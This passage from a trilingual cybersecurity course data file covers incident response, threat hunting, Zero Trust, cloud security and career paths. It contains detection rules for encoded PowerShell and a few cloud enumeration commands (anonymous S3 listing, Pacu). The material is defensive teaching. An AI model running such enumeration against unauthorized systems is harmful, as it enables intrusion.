   - Nima yaxshi ishladi?
   - Nima yaxshilanishi kerak?</code></pre>
<h3>🔍 Forensic asoslari</h3>
<pre><code># Volatility — RAM tahlili:
vol.py -f memory.dmp --profile=Win10x64 pslist    # jarayonlar
vol.py -f memory.dmp --profile=Win10x64 netscan   # tarmoq
vol.py -f memory.dmp --profile=Win10x64 malfind   # inject kod

# Disk forensic (Autopsy GUI yoki:):
# FTK Imager — disk nusxa:
dd if=/dev/sda of=disk_image.dd bs=4096

# Timeline yaratish:
log2timeline.py plaso.db /path/to/disk
psort.py -o l2tcsv plaso.db "date > '2024-01-01'"</code></pre>
<h3>📞 IR jarayonida muloqot</h3>
<div class="info-box">
<p><strong>Ichki:</strong> IT jamoasi, rahbariyat, yuridik bo'lim, HR</p>
<p><strong>Tashqi:</strong> Mijozlar, regulyatorlar, media (ehtiyotkorlik bilan!)</p>
<p><strong>Qonuniy talablar:</strong> GDPR — 72 soat ichida xabar berish. PCI DSS — darhol xabar berish.</p>
</div>`,
          ru:`<h2>Реагирование на инциденты</h2>
<h3>📋 IR процесс (NIST SP 800-61)</h3>
<pre><code">1. Подготовка — план IR, команда, инструменты
2. Идентификация — есть ли инцидент? IOC сбор
3. Сдерживание — изоляция, forensic копия
4. Устранение — удалить малварь, закрыть уязвимость
5. Восстановление — тестирование, постепенный возврат
6. Уроки — что сработало? что улучшить?</code></pre>
<h3>🔍 Forensic инструменты</h3>
<pre><code"># Volatility (RAM анализ):
vol.py -f memory.dmp --profile=Win10x64 pslist
vol.py -f memory.dmp --profile=Win10x64 netscan
vol.py -f memory.dmp --profile=Win10x64 malfind</code></pre>`,
          en:`<h2>Incident Response</h2>
<h3>📋 IR process (NIST SP 800-61)</h3>
<pre><code">1. Preparation — IR plan, team, tools
2. Identification — is there an incident? IOC collection
3. Containment — isolation, forensic copy
4. Eradication — remove malware, close vulnerability
5. Recovery — test, gradual return to service
6. Lessons Learned — what worked? what to improve?</code></pre>
<h3>🔍 Forensic tools</h3>
<pre><code"># Volatility (RAM analysis):
vol.py -f memory.dmp --profile=Win10x64 pslist
vol.py -f memory.dmp --profile=Win10x64 netscan
vol.py -f memory.dmp --profile=Win10x64 malfind</code></pre>`
        },
        quiz:[
          { q:{uz:"IR jarayonida 'Containment' bosqichining maqsadi?",ru:"Цель этапа 'Containment' в IR процессе?",en:"What is the goal of the 'Containment' stage in IR?"},
            options:{uz:["Barcha loglarni o'chirish","Zararni cheklash va tarqalishini to'xtatish, forensic nusxa olish","Yangi xodim yollash","Tizimni o'chirish"],ru:["Удалить все логи","Ограничить ущерб, остановить распространение, сделать forensic копию","Нанять нового сотрудника","Выключить систему"],en:["Delete all logs","Limit damage, stop spread, take forensic copy","Hire new staff","Turn off system"]}, answer:1 }
        ]
      },
      {
        id:"c4w15l3",
        title:{ uz:"Threat Hunting va Detection Engineering", ru:"Threat Hunting и Detection Engineering", en:"Threat Hunting and Detection Engineering" },
        duration:"40 daq",
        content:{
          uz:`<h2>Threat Hunting va Detection Engineering</h2>
<h3>🎯 Threat Hunting nima?</h3>
<p>Threat Hunting — avtomatik tizimlar sezmasdan o'tgan tahdidlarni proaktiv qidirish. "Menimcha hujumchi tarmog'imda — uni topay."</p>
<div class="info-box">
<p><strong>Reaktiv (SOC):</strong> Alert keldi → tekshirish</p>
<p><strong>Proaktiv (Threat Hunter):</strong> Alert kutmasdan o'zi qidiradi</p>
</div>
<h3>🔍 Threat Hunting metodologiyasi</h3>
<pre><code">1. HYPOTHESIS (Faraziya)
   "Hujumchi PowerShell dan foydalanayotgan bo'lishi mumkin"

2. INVESTIGATE (Tekshirish)
   index=windows EventCode=4104
   CommandLine="*-enc*" OR CommandLine="*bypass*"
   | table _time, ComputerName, User, CommandLine

3. PATTERN topish
   Normal PowerShell: C:\\Windows\\System32\\...
   Shubhali: C:\\Users\\public\\update.ps1

4. DOCUMENT va TUNE
   Yangi detection qoidasi yozish</code></pre>
<h3>⚡ Detection Engineering</h3>
<pre><code># SIGMA qoidalari yozish:
title: Suspicious PowerShell Encoded Command
description: Detects PowerShell with encoded commands (common malware technique)
logsource:
  product: windows
  service: powershell
detection:
  selection:
    EventID: 4104
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc '
      - '-e '
  condition: selection
falsepositives:
  - Legitimate admin scripts
level: high
tags:
  - attack.execution
  - attack.t1059.001  # MITRE ATT&CK ID!</code></pre>
<h3>📊 Threat Hunting vositalari</h3>
<pre><code"># Elasticsearch + Kibana (ELK):
GET /winlogbeat-*/_search
{
  "query": {
    "bool": {
      "must": [
        {"term": {"event.code": "4688"}},
        {"wildcard": {"process.command_line": "*powershell*-enc*"}}
      ]
    }
  }
}

# Velociraptor — endpoint forensic:
# Remote artifact collection
# Live response
# Timeline analysis

# YARA rules — malware pattern match:
rule Suspicious_PowerShell {
    strings:
        $enc = "-EncodedCommand" nocase
        $bypass = "bypass" nocase
    condition:
        any of them
}</code></pre>`,
          ru:`<h2>Threat Hunting и Detection Engineering</h2>
<h3>🎯 Что такое Threat Hunting?</h3>
<p>Проактивный поиск угроз, которые не были обнаружены автоматически.</p>
<pre><code"># Поиск подозрительного PowerShell:
index=windows EventCode=4104
CommandLine="*-enc*" OR CommandLine="*bypass*"
| table _time, ComputerName, User, CommandLine</code></pre>
<h3>⚡ SIGMA правило</h3>
<pre><code>title: Suspicious PowerShell Encoded Command
detection:
  selection:
    EventID: 4104
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc '
  condition: selection
level: high</code></pre>`,
          en:`<h2>Threat Hunting and Detection Engineering</h2>
<h3>🎯 What is Threat Hunting?</h3>
<p>Proactively searching for threats that automated systems haven't detected.</p>
<pre><code"># Hunt for suspicious PowerShell:
index=windows EventCode=4104
CommandLine="*-enc*" OR CommandLine="*bypass*"
| table _time, ComputerName, User, CommandLine</code></pre>
<h3>⚡ SIGMA rule</h3>
<pre><code>title: Suspicious PowerShell Encoded Command
detection:
  selection:
    EventID: 4104
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc '
  condition: selection
level: high</code></pre>`
        },
        quiz:[
          { q:{uz:"Threat Hunting va oddiy SOC monitoring farqi?",ru:"Отличие Threat Hunting от обычного мониторинга SOC?",en:"Difference between Threat Hunting and regular SOC monitoring?"},
            options:{uz:["Threat Hunting tezroq","SOC proaktiv, Threat Hunting reaktiv","Threat Hunting proaktiv — alert kutmasdan o'zi qidiradi","Farqi yo'q"],ru:["Threat Hunting быстрее","SOC проактивный, Threat Hunting реактивный","Threat Hunting проактивный — ищет сам без ожидания алертов","Нет разницы"],en:["Threat Hunting is faster","SOC is proactive, Threat Hunting reactive","Threat Hunting is proactive — searches without waiting for alerts","No difference"]}, answer:2 }
        ]
      }
    ]
  },

  // ─── 16-hafta: Arxitektura va Karyera ───
  {
    id:"c4w16", level:4, week:16, icon:"👑", color:"#ffd700",
    title:{ uz:"Xavfsizlik Arxitekturasi va Karyera", ru:"Архитектура безопасности и карьера", en:"Security Architecture and Career" },
    desc:{ uz:"Zero Trust, Cloud xavfsizligi, ISO 27001, sertifikatlar va karyera yo'li", ru:"Zero Trust, облачная безопасность, ISO 27001, сертификаты и карьерный путь", en:"Zero Trust, Cloud security, ISO 27001, certifications and career path" },
    duration:{ uz:"3 × 40 daqiqa", ru:"3 × 40 минут", en:"3 × 40 minutes" },
    lessons:[
      {
        id:"c4w16l1",
        title:{ uz:"Zero Trust va Xavfsizlik Arxitekturasi", ru:"Zero Trust и архитектура безопасности", en:"Zero Trust and Security Architecture" },
        duration:"40 daq",
        content:{
          uz:`<h2>Zero Trust va Xavfsizlik Arxitekturasi</h2>
<h3>🏛️ Zero Trust nima?</h3>
<p>"Hech kimga ishonma, hammasini tekshir." — Google BeyondCorp (2014)</p>
<div class="info-box">
<p><strong>Eski model (Castle and Moat):</strong> Ichki tarmoqqa ishoniladi. "Devordan o'tsa — xavfsiz."</p>
<p><strong>Zero Trust:</strong> Joylashuv muhim emas. Har bir so'rov tekshiriladi. Foydalanuvchi + qurilma + kontekst.</p>
</div>
<h3>🔑 Zero Trust printsiplari</h3>
<pre><code">1. Verify Explicitly (Har doim tekshir)
   - MFA + SSO
   - Device health check
   - Behavioral analytics

2. Least Privilege (Minimal ruxsat)
   - Just-in-Time access
   - Just-Enough-Access
   - Privileged Identity Management

3. Assume Breach (Buzilgan deb hisob)
   - Micro-segmentation
   - End-to-end encryption
   - Real-time monitoring</code></pre>
<h3>🏗️ Defence in Depth (Chuqurlik himoyasi)</h3>
<pre><code">
[Internet]
    ↓
[WAF / DDoS Protection]     ← 1-qatlam: Perimetr
    ↓
[Firewall / IDS/IPS]        ← 2-qatlam: Tarmoq
    ↓
[Network Segmentation]      ← 3-qatlam: Bo'laklash
    ↓
[Host-based Security]       ← 4-qatlam: Endpoint
    ↓
[Application Security]      ← 5-qatlam: Dastur
    ↓
[Data Encryption]           ← 6-qatlam: Ma'lumot
    ↓
[Monitoring + IR]           ← 7-qatlam: Nazorat</code></pre>
<h3>📐 Xavfsizlik standartlari</h3>
<div class="info-box">
<p><strong>ISO 27001:</strong> ISMS (Information Security Management System) sertifikati</p>
<p><strong>NIST CSF:</strong> Identify, Protect, Detect, Respond, Recover</p>
<p><strong>PCI DSS:</strong> To'lov karta ma'lumotlari xavfsizligi</p>
<p><strong>SOC 2:</strong> Xizmat tashkilotlari uchun</p>
<p><strong>GDPR:</strong> Yevropa ma'lumotlarni himoya qilish qonuni</p>
</div>`,
          ru:`<h2>Zero Trust и архитектура безопасности</h2>
<h3>🏛️ Zero Trust</h3>
<div class="info-box">
<p><strong>Старая модель:</strong> Внутренней сети доверяют. "Если прошёл через стену — безопасен."</p>
<p><strong>Zero Trust:</strong> Расположение не важно. Каждый запрос проверяется. Пользователь + устройство + контекст.</p>
</div>
<h3>🏗️ Defence in Depth</h3>
<pre><code">WAF → Firewall → Сегментация → Endpoint → App → Данные → Мониторинг</code></pre>
<h3>📐 Стандарты безопасности</h3>
<div class="info-box">
<p><strong>ISO 27001:</strong> СМИБ сертификат</p>
<p><strong>NIST CSF:</strong> Identify, Protect, Detect, Respond, Recover</p>
<p><strong>GDPR:</strong> Европейский закон о защите данных</p>
</div>`,
          en:`<h2>Zero Trust and Security Architecture</h2>
<h3>🏛️ Zero Trust</h3>
<div class="info-box">
<p><strong>Old model:</strong> Internal network is trusted. "If they got past the wall — safe."</p>
<p><strong>Zero Trust:</strong> Location doesn't matter. Every request verified. User + device + context.</p>
</div>
<h3>🏗️ Defence in Depth</h3>
<pre><code">WAF → Firewall → Segmentation → Endpoint → App → Data → Monitoring</code></pre>
<h3>📐 Security standards</h3>
<div class="info-box">
<p><strong>ISO 27001:</strong> ISMS certification</p>
<p><strong>NIST CSF:</strong> Identify, Protect, Detect, Respond, Recover</p>
<p><strong>GDPR:</strong> European data protection law</p>
</div>`
        },
        quiz:[
          { q:{uz:"Zero Trust ning asosiy printsipi?",ru:"Основной принцип Zero Trust?",en:"Core principle of Zero Trust?"},
            options:{uz:["Ichki tarmoqqa ishon","Hech kimga ishonma — har bir so'rovni tekshir","Faqat VPN ishlatish","Parollarni almashtirib turish"],ru:["Доверяй внутренней сети","Никому не доверяй — проверяй каждый запрос","Только VPN","Менять пароли"],en:["Trust internal network","Trust nobody — verify every request","VPN only","Rotate passwords"]}, answer:1 }
        ]
      },
      {
        id:"c4w16l2",
        title:{ uz:"Cloud Xavfsizligi", ru:"Облачная безопасность", en:"Cloud Security" },
        duration:"40 daq",
        content:{
          uz:`<h2>Cloud Xavfsizligi</h2>
<h3>☁️ Cloud xizmat modellari</h3>
<div class="info-box">
<p><strong>IaaS (Infrastructure as a Service):</strong> AWS EC2, Azure VM — siz OS va undan yuqorisini boshqarasiz</p>
<p><strong>PaaS (Platform as a Service):</strong> Heroku, AWS Lambda — siz faqat kodini boshqarasiz</p>
<p><strong>SaaS (Software as a Service):</strong> Google Workspace, Office 365 — hamma narsa xizmat tarzida</p>
</div>
<h3>🔒 Shared Responsibility Model</h3>
<pre><code"># AWS misoli:
AWS MAS'UL:        SIZ MAS'UL:
Fizik xavfsizlik   Ma'lumotlar
Tarmoq altyapisi   Ilova xavfsizligi
Virtualizatsiya    Identity (IAM)
                   OS (IaaS da)
                   Shifrlash
                   Konfiguratsiya</code></pre>
<h3>⚠️ Cloud xavfsizlik muammolari</h3>
<pre><code"># Eng ko'p uchraydigan xatolar:

1. S3 Bucket ochiq qoldiriladi:
aws s3 ls s3://company-backup --no-sign-request
# Hamma ko'ra oladi!

# Tekshirish:
aws s3api get-bucket-acl --bucket mybucket
# "AllUsers" bo'lmasin!

2. IAM haddan tashqari ruxsatlar:
# ❌ Yomon:
{"Effect":"Allow","Action":"*","Resource":"*"}
# Hamma narsaga ruxsat = xavfli!

# ✅ Yaxshi:
{"Effect":"Allow","Action":"s3:GetObject","Resource":"arn:aws:s3:::mybucket/*"}

3. Ochiq security group:
# ❌ Xavfli: 0.0.0.0/0 dan 22 port
# ✅ Xavfsiz: office_ip/32 dan 22 port</code></pre>
<h3>🛠️ Cloud Pen-test vositalar</h3>
<pre><code"># ScoutSuite — multi-cloud audit:
scout aws --profile myprofile

# Pacu — AWS exploitation:
import_keys myprofile
run iam__enum_permissions

# CloudSploit — zaiflik topish
# Prowler — AWS CIS benchmark tekshirish:
prowler -g cislevel1</code></pre>
<h3>🔐 Cloud xavfsizlik yaxshi amaliyotlar</h3>
<ul>
<li><strong>MFA hamma hisoblarda</strong></li>
<li><strong>Root hisobni faqat emergency</strong></li>
<li><strong>CloudTrail yoqish</strong> — barcha API chaqiruvlarini log qilish</li>
<li><strong>GuardDuty</strong> — AWS threat detection</li>
<li><strong>Secret Manager</strong> — credentials kodda emas</li>
<li><strong>VPC</strong> — tarmoq izolyatsiyasi</li>
</ul>`,
          ru:`<h2>Облачная безопасность</h2>
<h3>☁️ Модели облачных сервисов</h3>
<div class="info-box">
<p><strong>IaaS:</strong> AWS EC2, Azure VM — вы управляете ОС и выше</p>
<p><strong>PaaS:</strong> Heroku, AWS Lambda — только код</p>
<p><strong>SaaS:</strong> Google Workspace — всё как сервис</p>
</div>
<h3>⚠️ Частые ошибки Cloud</h3>
<pre><code"># Открытый S3 Bucket:
aws s3 ls s3://company-backup --no-sign-request

# Избыточные IAM права:
{"Action":"*","Resource":"*"}  # опасно!

# Открытый security group:
0.0.0.0/0:22  # опасно!</code></pre>`,
          en:`<h2>Cloud Security</h2>
<h3>☁️ Cloud service models</h3>
<div class="info-box">
<p><strong>IaaS:</strong> AWS EC2, Azure VM — you manage OS and above</p>
<p><strong>PaaS:</strong> Heroku, AWS Lambda — just code</p>
<p><strong>SaaS:</strong> Google Workspace — everything as a service</p>
</div>
<h3>⚠️ Common cloud mistakes</h3>
<pre><code"># Open S3 Bucket:
aws s3 ls s3://company-backup --no-sign-request

# Over-permissive IAM:
{"Action":"*","Resource":"*"}  # dangerous!

# Open security group:
0.0.0.0/0:22  # dangerous!</code></pre>`
        },
        quiz:[
          { q:{uz:"AWS da S3 bucket xavfsizligini ta'minlashda birinchi qadam?",ru:"Первый шаг для обеспечения безопасности S3 bucket в AWS?",en:"First step to secure an S3 bucket in AWS?"},
            options:{uz:["Ko'proq ma'lumot yuklash","Ommaviy kirishni o'chirish va ACL ni tekshirish","Bucket nomini o'zgartirish","Region o'zgartirish"],ru:["Загрузить больше данных","Отключить публичный доступ и проверить ACL","Переименовать bucket","Сменить регион"],en:["Upload more data","Disable public access and review ACL","Rename the bucket","Change region"]}, answer:1 }
        ]
      },
      {
        id:"c4w16l3",
        title:{ uz:"Sertifikatlar va Karyera yo'li", ru:"Сертификаты и карьерный путь", en:"Certifications and career path" },
        duration:"40 daq",
        content:{
          uz:`<h2>Sertifikatlar va Karyera Yo'li</h2>
<p>Tabriklaymiz! 4 oylik EmerX kursi tugatdingiz. Endi oldinga qarab ketishingiz uchun yo'l xaritasi:</p>
<h3>📜 Sertifikat yo'llari</h3>
<div class="info-box">
<p><strong>🟢 Boshlang'ich:</strong></p>
<p>CompTIA Security+ → Google Cybersecurity Certificate → CompTIA Network+</p>
<p><strong>🔵 O'rta:</strong></p>
<p>CEH (Certified Ethical Hacker) → CompTIA PenTest+ → CompTIA CySA+</p>
<p><strong>🔴 Ilg'or:</strong></p>
<p>OSCP (OffSec Certified Professional) → OSCE3 → CRTP (Active Directory)</p>
<p><strong>👑 Senior/Specialist:</strong></p>
<p>CISSP → CISM → GIAC sertifikatlar (GPEN, GWAPT, GCFE...)</p>
</div>
<h3>💰 Maosh va Karyera</h3>
<pre><code"># O'zbekiston bozori (2024):
Junior Security Analyst:  $500 - $1,500/oy
Middle Pentester:         $1,500 - $3,000/oy
Senior Security Engineer: $3,000 - $6,000/oy
CISO:                     $5,000 - $15,000/oy

# Global (remote ish):
Junior:   $50,000 - $80,000/yil
Middle:   $80,000 - $130,000/yil
Senior:   $130,000 - $200,000/yil
Lead/CISO: $200,000+/yil</code></pre>
<h3>🗺️ Ixtisoslashuv yo'llari</h3>
<pre><code"># Penetration Testing yo'li:
Security+ → CEH → OSCP → OSCE3

# Blue Team / SOC yo'li:
Security+ → CySA+ → GCIA → GCFE

# Cloud Security yo'li:
Security+ → AWS Security Specialty → CCSP

# Application Security yo'li:
Security+ → GWEB → BSCP (PortSwigger)

# Forensics / DFIR yo'li:
Security+ → GCFE → GCFA → GCFR</code></pre>
<h3>🚀 Keyingi qadamlar</h3>
<div class="info-box">
<p>✅ TryHackMe / HackTheBox da faol bo'ling (kuniga 1 saat)</p>
<p>✅ Bug Bounty boshlang — HackerOne, Bugcrowd</p>
<p>✅ CTF musobaqalarda ishtirok eting</p>
<p>✅ LinkedIn profil yarating — "Open to work"</p>
<p>✅ GitHub da loyihalaringizni ko'rsating</p>
<p>✅ Mahalliy kiberxavfsizlik hamjamiyatlariga qo'shiling</p>
<p>✅ OSCP ga ro'yxatdan o'ting — kasbiy erishim</p>
</div>
<h3>🏆 EmerX kursi yakunlash</h3>
<p>Siz 4 oyda boshlang'ichdan Senior darajasigacha bo'lgan bilimlarni o'rgandingiz. Bu bor-yo'g'i boslanish — real tajriba amaliyot orqali keladi.</p>
<p><strong>Davom eting, sinab ko'ring, va eng muhimi — etik bo'ling! 🛡️</strong></p>`,
          ru:`<h2>Сертификаты и карьерный путь</h2>
<h3>📜 Сертификационные пути</h3>
<div class="info-box">
<p><strong>🟢 Начальный:</strong> CompTIA Security+ → Google Cybersecurity</p>
<p><strong>🔵 Средний:</strong> CEH → CompTIA PenTest+ → CySA+</p>
<p><strong>🔴 Продвинутый:</strong> OSCP → OSCE3 → CRTP</p>
<p><strong>👑 Senior:</strong> CISSP → CISM → GIAC</p>
</div>
<h3>💰 Зарплаты (глобально)</h3>
<pre><code"># Remote работа:
Junior:    $50,000 - $80,000/год
Middle:    $80,000 - $130,000/год
Senior:    $130,000 - $200,000/год
Lead/CISO: $200,000+/год</code></pre>
<h3>🚀 Следующие шаги</h3>
<div class="info-box">
<p>✅ TryHackMe / HackTheBox — 1 час в день</p>
<p>✅ Bug Bounty — HackerOne, Bugcrowd</p>
<p>✅ CTF соревнования</p>
<p>✅ LinkedIn профиль — "Open to work"</p>
<p>✅ OSCP — профессиональная цель</p>
</div>`,
          en:`<h2>Certifications and career path</h2>
<h3>📜 Certification paths</h3>
<div class="info-box">
<p><strong>🟢 Entry:</strong> CompTIA Security+ → Google Cybersecurity</p>
<p><strong>🔵 Mid:</strong> CEH → CompTIA PenTest+ → CySA+</p>
<p><strong>🔴 Advanced:</strong> OSCP → OSCE3 → CRTP</p>
<p><strong>👑 Senior:</strong> CISSP → CISM → GIAC</p>
</div>
<h3>💰 Salaries (global)</h3>
<pre><code"># Remote work:
Junior:    $50,000 - $80,000/year
Middle:    $80,000 - $130,000/year
Senior:    $130,000 - $200,000/year
Lead/CISO: $200,000+/year</code></pre>
<h3>🚀 Next steps</h3>
<div class="info-box">
<p>✅ TryHackMe / HackTheBox — 1 hour daily</p>
<p>✅ Bug Bounty — HackerOne, Bugcrowd</p>
<p>✅ CTF competitions</p>
<p>✅ LinkedIn profile — "Open to work"</p>
<p>✅ OSCP — professional goal</p>
</div>`
        },
        quiz:[
          { q:{uz:"OSCP sertifikati qaysi soha uchun?",ru:"Для какой области сертификат OSCP?",en:"What field is the OSCP certification for?"},
            options:{uz:["Cloud xavfsizligi","Penetratsion test (pen-testing)","Forensics","Network dizayn"],ru:["Облачная безопасность","Тестирование на проникновение (пентест)","Криминалистика","Сетевой дизайн"],en:["Cloud security","Penetration testing","Forensics","Network design"]}, answer:1 },
          { q:{uz:"EmerX kursini tugatgandan keyin birinchi amaliy qadam?",ru:"Первый практический шаг после завершения курса EmerX?",en:"First practical step after completing the EmerX course?"},
            options:{uz:["Dam olish","TryHackMe / HackTheBox da mashq qilish va Bug Bounty boshlash","Darhol CISO bo'lish","Barcha vositalarni o'rnatish"],ru:["Отдохнуть","Практиковаться на TryHackMe/HackTheBox и начать Bug Bounty","Сразу стать CISO","Установить все инструменты"],en:["Rest","Practice on TryHackMe/HackTheBox and start Bug Bounty","Immediately become CISO","Install all tools"]}, answer:1 }
        ]
      }
    ]
  }
];
